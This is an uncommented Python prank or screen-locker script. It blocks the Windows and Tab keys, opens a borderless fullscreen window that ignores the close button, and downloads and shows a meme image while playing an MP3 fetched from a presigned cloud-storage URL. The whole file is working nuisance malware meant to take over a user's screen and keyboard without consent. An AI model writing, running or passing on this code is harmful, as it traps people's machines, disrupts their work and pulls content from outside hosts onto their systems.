from PIL import Image, ImageTk
from pygame import mixer
import urllib.request 
import keyboard 
import tkinter
import sys
    


image_url = "https://i.kym-cdn.com/entries/icons/original/000/041/815/cover3.jpg"

keyboard.block_key('Win')
keyboard.block_key('tab')


def do_exit():
    pass

def showPIL(pilImage):
    
    root = tkinter.Tk()
    
    w, h = root.winfo_screenwidth(), root.winfo_screenheight()
    
    root.overrideredirect(1)
    root.geometry("%dx%d+0+0" % (w, h))
    root.focus_set()
    root.protocol("WM_DELETE_WINDOW", do_exit)
    
    canvas = tkinter.Canvas(root,width=w,height=h)
    canvas.pack()
    canvas.configure(background='black')
    
    imgWidth, imgHeight = pilImage.size
    
    if imgWidth > w or imgHeight > h:
        ratio = min(w/imgWidth, h/imgHeight)
        imgWidth = int(imgWidth*ratio)
        imgHeight = int(imgHeight*ratio)
        
    image = ImageTk.PhotoImage(pilImage)
    
    imagesprite = canvas.create_image(w/2,h/2,image=image)

    url = "https://upnow-prod.ff45e40d1a1c8f7e7de4e976d0c9e555.r2.cloudflarestorage.com/3ew37Ph3XqSxvBg4iAkBYCZ0Tuu1/779efbce-518b-4fea-9167-915d9dca6683?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=cdd12e35bbd220303957dc5603a4cc8e%2F20240125%2Fauto%2Fs3%2Faws4_request&X-Amz-Date=20240125T012637Z&X-Amz-Expires=43200&X-Amz-Signature=0be9576a55bd44e58c49f3e96012bc6ac1604bdf960b5bfde71a29f6755fab58&X-Amz-SignedHeaders=host&response-content-disposition=attachment%3B%20filename%3D%22china.mp3%22"

    mp3file = urllib.request.urlretrieve(url, "song.mp3")
    
    mixer.init()
    mixer.music.load("song.mp3")
    mixer.music.play()


    root.mainloop()
    

urllib.request.urlretrieve(image_url, "man.jpg") 

image = Image.open("man.jpg")


showPIL(image)
  





